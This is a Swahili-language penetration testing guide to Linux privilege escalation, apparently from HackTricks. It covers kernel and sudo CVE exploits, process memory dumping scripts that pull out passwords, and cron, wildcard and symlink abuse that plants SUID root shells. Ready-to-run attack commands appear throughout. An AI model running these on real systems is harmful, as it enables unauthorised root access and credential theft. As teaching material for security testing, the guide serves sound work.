# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Kwa muktadha mpana na mtiririko wa kihistoria wa kufanya enumeration, linganisha nyenzo za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private-i zilizoorodheshwa kwenye marejeleo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kwa kupata maarifa kuhusu OS inayoendesha sasa

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya kigezo cha `PATH`**, unaweza kuteka nyara baadhi ya maktaba au binaries:

```bash
echo $PATH
```

### Taarifa za mazingira

Taarifa za kuvutia, nywila au API keys kwenye environment variables?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumiwa kupandisha ruhusa.

Sehemu ya [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) inakusanya mifano ya kupandisha ruhusa ndani ya mfumo na viungo vya maelezo ya kina kuhusu Linux kernel katika Binary Exploitation. Thibitisha build na usanidi unaoathiriwa kabla ya kujaribu mfano.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Unaweza kupata orodha nzuri ya kernel zilizo hatarini pamoja na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambako unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo hatarini kutoka kwenye tovuti hiyo, unaweza kufanya hivi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, hukagua tu exploits za kernel 2.x)

Daima **tafuta kernel version kwenye Google**; huenda kernel version yako imeandikwa kwenye kernel exploit fulani, na hapo utakuwa na uhakika kuwa exploit hiyo ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Toleo la Sudo

Kulingana na matoleo ya sudo yaliyo hatarini yanayoonekana kwenye:

```bash
searchsploit sudo
```

Unaweza kuangalia kama toleo la sudo lina udhaifu kwa kutumia grep hii.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

sudo ya upstream **1.9.14 hadi 1.9.17** huruhusu watumiaji wa ndani wasio na haki maalum kujipandisha hadi root kupitia chaguo la `--chroot` wakati sudo inapopakia `/etc/nsswitch.conf` kutoka saraka inayodhibitiwa na mtumiaji; upstream ilirekebisha hili katika **1.9.17p1**. Kagua kila binary ya sudo inayoweza kutekelezwa yenye root-setuid katika njia husika, kwa kuwa `sudo -V` huripoti tu binary iliyochaguliwa na `PATH`. Vifurushi vya usambazaji vinaweza kujumuisha marekebisho ya nyuma bila kubadilisha mfuatano wa toleo la upstream, kwa hiyo thibitisha pia hali ya kifurushi cha vendor. Tazama [ushauri wa maintainer wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) hiyo. Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina vulnerability hiyo na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejelea [ushauri wa awali kuhusu vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Bypass ya sheria za sudo zinazotegemea host (CVE-2025-32462)

sudo ya upstream **1.8.8 hadi 1.9.17** inaweza kutathmini sheria za sudoers zinazotegemea host kwa kutumia **jina la host lililotolewa na mtumiaji** kutoka `sudo -h <host>` badala ya **jina halisi la host**; upstream ilirekebisha hili katika **1.9.17p1**. Mtumiaji bado anahitaji kuwa na ingizo linalolingana la sudoers kwenye host iliyochaguliwa. Kagua marekebisho ya nyuma ya vendor na binary mbadala za sudo, pamoja na sera ya ndani. Tazama [ushauri wa maintainer wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Mahitaji:
- Toleo la sudo lenye vulnerability
- Sheria za sudoers mahususi kwa host (host si jina la host ya sasa wala `ALL`)

Mfano wa muundo wa sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit kwa spoofing host inayoruhusiwa:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ikiwa utatuzi wa jina lililochaguliwa utazuiwa, hakikisha jinsi jina hilo linavyotatuliwa kwenye host. Kuona tu jina kwenye logi au faili ya usanidi hakumaanishi kuwa linaweza kutatuliwa, na kubadilisha `/etc/hosts` kwa kawaida kunahitaji ruhusa za kuandika za privileged.

#### sudo < v1.8.28

[Upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) hii inahitaji sheria ya sudo inayotumika na kuruhusu amri kutekelezwa kama watumiaji `ALL` huku ikimwondoa root, kama vile `(ALL, !root) /bin/bash`. Mtumiaji anayeita amri lazima pia aruhusiwe kutumia sheria hiyo, pamoja na hitaji lolote la uthibitishaji. Angalia ushauri wa kifurushi kilichosakinishwa: wachuuzi waliweka marekebisho kwenye matoleo ambayo toleo lake la upstream linaloonyeshwa bado ni chini ya 1.8.28. Sheria ya `!root` au toleo la zamani pekee havithibitishi kuwa mfumo uko hatarini. Usijaribu amri yenye privileged wakati wa enumeration tulivu.

```
sudo -u#-1 /bin/bash
```

### Uthibitishaji wa sahihi ya Dmesg umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inavyoweza kutumiwa.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Ukusanyaji zaidi wa taarifa za mfumo

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Orodhesha ulinzi unaowezekana

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo kuhusu usalama wa container, kisha pivot hadi kurasa za matumizi mabaya zinazohusu runtime husika:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diski

Kagua **ni nini kimewekwa kwenye mount na nini kimeondolewa kwenye mount**, wapi na kwa nini. Ikiwa kuna kitu chochote kilichoondolewa kwenye mount, unaweza kujaribu kukiweka kwenye mount na kuangalia kama kina taarifa za faragha.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Programu muhimu

Orodhesha faili za binary muhimu

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Pia, angalia kama **compiler yoyote imesakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inapendekezwa kuikompile kwenye mashine utakayoitumia (au kwenye mashine inayofanana nayo).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Programu Hatarishi Zilizosakinishwa

Angalia **toleo la packages na services zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa privilege escalation…\
Inapendekezwa uangalie mwenyewe matoleo ya programu zilizosakinishwa zinazotia shaka zaidi.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia kama kuna programu zilizopitwa na wakati na zilizo katika hatari ya kushambuliwa zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo nyingi hazitakuwa na manufaa, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au zinazofanana nayo, zitakazoangalia kama toleo lolote la programu iliyosakinishwa liko katika hatari ya kushambuliwa kupitia exploits zinazojulikana_

## Processes

Angalia **processes** zinazotekelezwa na uhakikishe kama kuna process yoyote yenye **ruhusa nyingi zaidi kuliko inavyopaswa** (labda tomcat inayoendeshwa na root?)

```bash
ps aux
ps -ef
top -n 1
```

Daima angalia kama kuna [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) zinazoendesha; unaweza kuzitumia vibaya ili kupata privileges za juu. **Linpeas** huzitambua kwa kuangalia parameta ya `--inspect` ndani ya command line ya process.\
Pia **angalia privileges zako juu ya binaries za processes**; huenda unaweza kuandika juu ya binary ya mtu mwingine.

### Minyororo ya parent-child kati ya watumiaji tofauti

Child process inayoendesha chini ya **user tofauti** na parent wake si lazima iwe na nia hasidi, lakini ni **ishara muhimu ya triage**. Baadhi ya mabadiliko hayo yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini minyororo isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya uaminifu wakati wa runtime.

Ukaguzi wa haraka:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ukipata mnyororo wa ajabu, kagua command line ya parent na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika njia kadhaa halisi za privesc, child yenyewe haikuweza kuandikwa, lakini **config inayodhibitiwa na parent** au mnyororo wa helper uliweza kuandikwa.

### Executables zilizofutwa na faili zilizofunguliwa kabla ya kufutwa

Mabaki ya runtime mara nyingi bado yanaweza kufikiwa **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kurejesha ushahidi kutoka kwa process ambayo tayari imefungua faili nyeti.

Angalia executables zilizofutwa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, mchakato bado unaendesha image ya binary ya zamani kutoka kwenye memory. Hii ni ishara muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials zinazovutia
- mchakato unaoendelea unaweza bado kufichua file descriptors zenye manufaa
- binary yenye privileged iliyoondolewa inaweza kuashiria tampering ya hivi karibuni au jaribio la kufuta ushahidi

Kusanya faili zilizo wazi lakini zimeondolewa kwenye mfumo mzima:

```bash
lsof +L1
```

Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Hili ni muhimu hasa wakati mchakato bado umefungua faili iliyofutwa yenye siri, script, nakala ya hifadhidata au flag.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kusaidia sana kutambua michakato iliyo hatarini inayoendeshwa mara kwa mara au pale seti fulani ya masharti inapotimizwa.

#### ProcMon ya Linux chini ya sudo

[ProcMon ya Linux](https://github.com/microsoft/ProcMon-for-Linux) inaweza kufuatilia michakato na miito ya mfumo iliyochaguliwa na kuhifadhi trace ya SQLite. Ikiwa `sudo -l` inaruhusu amri ya `procmon` yenye uwezo wa root isiyo na vizuizi, fikiria kama inaweza kufuatilia ingizo au matokeo ya mchakato wa mtumiaji mwingine. Ruhusa hii ni kidokezo cha kuchunguza tu: usaidizi wa tracer, sera inayotumika na shughuli za mchakato unaofaa vyote vina umuhimu. Faili za trace zinaweza kuwa na siri, kwa hiyo kagua exports zilizoidhinishwa kwa uangalifu na epuka kukusanya data ya michakato isiyohusiana.

### Kumbukumbu ya mchakato

Baadhi ya huduma za seva huhifadhi **credentials katika maandishi ya kawaida ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **privileges za root** ili kusoma kumbukumbu ya michakato ya watumiaji wengine, kwa hiyo hili huwa na manufaa zaidi pale ambapo tayari una root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguomsingi**, kumaanisha kwamba huwezi kutoa dump ya michakato mingine ya mtumiaji wako asiye na privileges.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti ufikikaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Michakato yote inaweza kufanyiwa debugging mradi tu iwe na uid sawa. Hii ndiyo njia ya kawaida ambayo ptracing ilifanya kazi.
> - **kernel.yama.ptrace_scope = 1**: Mchakato mzazi pekee ndio unaweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: Admin pekee ndiye anayeweza kutumia ptrace, kwa kuwa inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kufuatiliwa kwa ptrace. Baada ya kuwekwa hivi, lazima uwashe upya mashine ili kuwezesha ptracing tena.

Mchakato wenye UID sawa unaofungua kwa muda mfupi hifadhi ya nywila unaweza kuwa mpaka tofauti wa credentials. Ufuatiliaji unaporuhusiwa, mchakato unaoendelea na unaoweza kutupwa kwenye dump unaweza kufichua nywila ya hifadhi kupitia syscalls zake za ingizo au kumbukumbu yake, ingawa faili ya hifadhi iliyosimbwa yenyewe bado inalindwa. `ptrace_scope=0` ni sharti moja tu: credentials zinazolingana, hali ya dumpability ya mchakato lengwa, Linux security modules nyingine na muda wa uhai wa mchakato pia vina umuhimu. Kuingia kwa root ya Unix kwa kutumia credential ya hifadhi kunahitaji ukaguzi tofauti wa matumizi tena ya credential. Uchunguzi wa kawaida unapaswa kuripoti sera na mchakato unaoweza kuhusika au njia za hifadhi, bila kunasa ingizo au kuchapisha siri. Tazama [nyaraka za Yama za kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) na [ukaguzi wa ufikiaji wa ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ikiwa unaweza kufikia kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta credentials zake ndani yake.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho fulani cha mchakato, **maps huonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia huonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** **hufichua kumbukumbu yenyewe ya michakato**. Kutoka kwenye faili ya **maps**, tunajua **ni maeneo gani ya kumbukumbu yanaweza kusomeka** na nafasi zake za kuanzia. Tunatumia taarifa hii **kutafuta nafasi husika ndani ya faili ya mem na kutupa maeneo yote yanayosomeka** kwenye faili.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu **halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, ni **root** na kundi la **kmem** pekee wanaoweza kusoma `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump for linux

ProcDump ni toleo la Linux lililobuniwa upya la zana asilia ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Zana

Ili kufanya dump ya kumbukumbu ya mchakato, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root wewe mwenyewe na kufanya dump ya mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vitambulisho kutoka kwenye Kumbukumbu ya Mchakato

#### Mfano wa mwongozo

Ukigundua kuwa mchakato wa authenticator unaendeshwa:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Unaweza kufanya dump ya process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za kufanya dump ya memory ya process) na kutafuta credentials ndani ya memory:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba taarifa za kuingia zilizo katika maandishi wazi kutoka kwenye kumbukumbu** na kutoka kwenye baadhi ya **faili zinazojulikana sana**. Inahitaji ruhusa za root ili kufanya kazi ipasavyo.

| Kipengele                                         | Jina la Mchakato   |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Eneo-kazi la Kali, Eneo-kazi la Debian) | gdm-password         |
| Gnome Keyring (Eneo-kazi la Ubuntu, Eneo-kazi la ArchLinux) | gnome-keyring-daemon |
| LightDM (Eneo-kazi la Ubuntu)                     | lightdm              |
| VSFTPd (Miunganisho Hai ya FTP)                   | vsftpd               |
| Apache2 (Vipindi Hai vya HTTP Basic Auth)         | apache2              |
| OpenSSH (Vipindi Hai vya SSH - Matumizi ya Sudo)  | sshd:                |

#### Regex za Kutafuta/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – privesc kupitia kipanga-ratiba cha wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda job yenye mapendeleo ya juu ili kufanya escalation.<sup>[[1]](#references)[[4]](#references)</sup>

Mfuatano wa kawaida
- Gundua port inayopatikana kwenye loopback pekee (k.m., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye faili za uendeshaji:
  - Backups/scripts zenye `zip -P <password>`
  - systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda job yenye privileges za juu na uiendeshe mara moja (inaweka shell ya SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```

Uimarishaji
- Usiendeshe Crontab UI kama root; tumia user maalum na ruhusa chache zaidi
- Funga kwenye localhost na uzuie ufikiaji zaidi kwa firewall/VPN; usitumie tena nywila
- Epuka kuweka siri ndani ya unit files; tumia secret stores au EnvironmentFile inayoweza kufikiwa na root pekee
- Washa ukaguzi/logging kwa utekelezaji wa job unaoanzishwa unapohitajika

Angalia kama kuna job yoyote iliyoratibiwa iliyo hatarini. Labda unaweza kutumia script inayoendeshwa na root (udhaifu wa wildcard? unaweza kurekebisha faili zinazotumiwa na root? kutumia symlinks? kuunda faili maalum kwenye directory inayotumiwa na root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ikiwa `run-parts` inatumika, angalia ni majina gani yatatekelezwa kweli:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Hii huepusha false positives. Saraka ya mara kwa mara inayoweza kuandikiwa ni muhimu tu ikiwa jina la faili la payload yako linalingana na sheria za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" alivyo na ruhusa za kuandika kwenye /home/user_)

Ikiwa mtumiaji root atajaribu kutekeleza amri au script ndani ya crontab hii bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron kutumia script yenye wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ikiwa wildcard imetanguliwa na path kama** _**/some/path/\***_ **, haina vulnerability (hata** _**./\***_ **haina).**

Soma ukurasa ufuatao kwa mbinu nyingine za exploitation ya wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection kwenye cron log parsers

Bash arithmetic inaweza kutafsiri maandishi yasiyoaminika kama expression. Katika baadhi ya mazingira ya Bash yaliyoathiriwa, array subscript ndani ya expression hiyo inaweza kutekeleza command substitution. Ikiwa cron/parser yenye privileged itaweka maandishi ya logi yanayodhibitiwa na attacker ndani ya ulinganisho huo wa arithmetic, substitution inaweza kutekelezwa kwa utambulisho wa parser.<sup>[[22]](#references)</sup> Hili hutegemea expression na toleo halisi la Bash; string tupu ya `$(...)0` kwenye variable iliyopanuliwa, yenyewe, si mfano wa kuaminika wa kutathminiwa tena.

Ingizo linaweza pia kutoka kwa metadata ya faili au sehemu nyingine inayosomwa kutoka eneo linaloweza kuandikwa na mtumiaji. Kwa mfano, script yenye privileged ya kusafisha faili inayosoma tag ya picha ya `Producer` na kuilinganisha kwa kutumia `[[ "$producer" -eq "expected" ]]` hufanya ulinganisho wa arithmetic, hata kama variable imewekwa ndani ya quotes. Fuatilia utambulisho unaotumiwa na kazi iliyoratibiwa, faili zinazoweza kutoa tag hiyo, mabadiliko yoyote yanayofanywa kabla ya ulinganisho, na tabia halisi ya Bash. Kwa labels za maandishi, tumia ulinganisho wa string; kwa namba, thibitisha kuwa ingizo lina tarakimu za desimali pekee kabla ya kufanya arithmetic. Tazama [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Muundo wa kawaida ulio hatarini:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Uchunguzi salama wa tabia ya ndani wa utaratibu wa array-subscript (hakuna mchakato wenye mapendeleo ya juu wala mabadiliko ya faili):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Fuatilia script halisi iliyoratibiwa na njia halisi ya ingizo inayofungua. Hata kama faili ya log haliwezi kuandikwa, mtumiaji anayeweza kuandika na kupita kwenye saraka yake ya mzazi isiyo na sticky bit anaweza kubadilisha ingizo lake la saraka; `namei -l` husaidia kutofautisha ruhusa hizo. Njia tofauti ya log inayoweza kuandikwa, scheduler isiyosomeka, au parser ambayo haitathmini kamwe sehemu hiyo kama hesabu za Bash, haithibitishi njia hii.

### Kubadilisha cron script na symlink

Ikiwa **unaweza kurekebisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ikiwa script inayotekelezwa na root inatumia **folda unayoweza kuifikia kikamilifu**, huenda ikafaa kuifuta folda hiyo na **kuunda folda ya symlink inayoelekeza kwenye folda nyingine** yenye script unayoidhibiti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Uthibitishaji wa symlink na ushughulikiaji salama zaidi wa faili

Unapokagua scripts/binaries zenye ruhusa za juu zinazosoma au kuandika faili kwa kutumia njia, hakikisha namna zinavyoshughulikia links:

- `stat()` hufuata symlink na kurudisha metadata ya lengwa.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kubaini lengwa la mwisho na kuonyesha ruhusa za kila sehemu ya njia.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Kwa watetezi/watengenezaji, mbinu salama zaidi dhidi ya hila za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: shindwa ikiwa njia tayari ipo (huzuia viungo/faili zilizoundwa awali na mshambuliaji).
- `openat()`: fanya kazi kwa kutumia njia inayohusiana na file descriptor ya saraka inayoaminika.
